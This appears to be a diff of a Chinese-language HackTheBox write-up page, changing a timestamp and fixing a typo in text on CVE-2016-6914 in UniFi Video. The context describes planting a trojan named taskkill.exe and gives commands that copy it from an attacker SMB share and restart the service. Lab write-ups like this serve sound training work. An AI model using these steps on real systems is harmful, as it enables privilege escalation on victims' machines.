@@ -45,7 +45,7 @@
 <meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1698157934243-212074a2-c58c-49d4-a25a-b94f88c3980f.png">
 <meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1698159133103-69fe641f-5bef-4607-939f-60d58dd8bb01.png">
 <meta property="article:published_time" content="2023-10-24T15:01:40.000Z">
-<meta property="article:modified_time" content="2023-10-24T15:04:33.929Z">
+<meta property="article:modified_time" content="2023-10-25T01:16:11.977Z">
 <meta property="article:author" content="076w">
 <meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary_large_image">
@@ -404,7 +404,7 @@
 
 <p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1698150112457-e1c68342-dfa2-4575-9364-a7a18b694170.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1698150472508-bfdd0a22-6859-4752-932a-db69d0372854.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>Ubiquiti UniFi Video中存在本地提取漏洞。本地攻击者可利用该漏洞以提升的权限执行任意代码。漏洞编号为CVE-2016-6914，在UniFi Video运行时会在目录 C:\ProgramData\unifi-video 下运行一个 taskkill.exe ，并提权，利用方式即为在目录下上传一个名为 taskkill.exe 的木马，再重启UniFi Video。</p>
+<p>Ubiquiti UniFi Video中存在本地提权漏洞。本地攻击者可利用该漏洞以提升的权限执行任意代码。漏洞编号为CVE-2016-6914，在UniFi Video运行时会在目录 C:\ProgramData\unifi-video 下运行一个 taskkill.exe ，并提权，利用方式即为在目录下上传一个名为 taskkill.exe 的木马，再重启UniFi Video。</p>
 <p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1698157830602-916ff014-c27f-40e3-b17a-bda890efaba8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>cs生成一个exe木马，利用impacket-smbserver上传到靶机，再关闭开启Ubiquiti UniFi Video服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">copy \\10.10.14.15\Share\taskkill.exe taskkill.exe<br>Stop-Service &quot;Ubiquiti UniFi Video&quot;<br>start-service unifivideoservice<br></code></pre></td></tr></table></figure>
